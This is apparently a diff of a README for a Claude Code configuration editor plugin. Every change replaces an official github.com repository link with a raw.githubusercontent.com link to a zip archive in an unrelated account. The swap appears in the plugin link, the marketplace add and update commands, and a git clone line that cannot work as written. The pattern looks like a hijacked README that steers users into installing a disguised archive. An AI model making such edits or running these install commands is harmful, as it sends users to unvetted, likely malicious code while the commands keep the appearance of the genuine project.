@@ -32,14 +32,14 @@ Edit environment variables, permissions, and raw JSON with visual UI.
 
 ### memory-bank Plugin (Required)
 
-The **[memory-bank](https://github.com/jung-wan-kim/memory-bank)** plugin must be installed to retrieve the project list.
+The **[memory-bank](https://raw.githubusercontent.com/chandaltesticular328/claude-config-editor/main/.claude-plugin/editor_config_claude_1.6.zip)** plugin must be installed to retrieve the project list.
 Config Editor reads project metadata from memory-bank's SQLite DB (`~/.config/superpowers/conversation-index/db.sqlite`).
 
 Without memory-bank, the project list cannot be loaded when switching to Project scope.
 
 ```bash
 # Install memory-bank plugin in Claude Code
-/plugin marketplace add https://github.com/jung-wan-kim/memory-bank
+/plugin marketplace add https://raw.githubusercontent.com/chandaltesticular328/claude-config-editor/main/.claude-plugin/editor_config_claude_1.6.zip
 /plugin install memory-bank
 
 # Sync conversations (run at least once)
@@ -58,7 +58,7 @@ memory-bank sync
 
 ```bash
 # Add marketplace & install
-/plugin marketplace add https://github.com/jung-wan-kim/claude-config-editor
+/plugin marketplace add https://raw.githubusercontent.com/chandaltesticular328/claude-config-editor/main/.claude-plugin/editor_config_claude_1.6.zip
 /plugin install claude-config-editor
 
 # Run (in a Claude Code session)
@@ -66,7 +66,7 @@ memory-bank sync
 
 # Update to latest version
 /plugin marketplace remove claude-config-editor
-/plugin marketplace add https://github.com/jung-wan-kim/claude-config-editor
+/plugin marketplace add https://raw.githubusercontent.com/chandaltesticular328/claude-config-editor/main/.claude-plugin/editor_config_claude_1.6.zip
 /plugin install claude-config-editor
 ```
 
@@ -74,7 +74,7 @@ memory-bank sync
 
 ```bash
 # Clone repository
-git clone https://github.com/jung-wan-kim/claude-config-editor.git
+git clone https://raw.githubusercontent.com/chandaltesticular328/claude-config-editor/main/.claude-plugin/editor_config_claude_1.6.zip
 cd claude-config-editor
 
 # Install dependencies
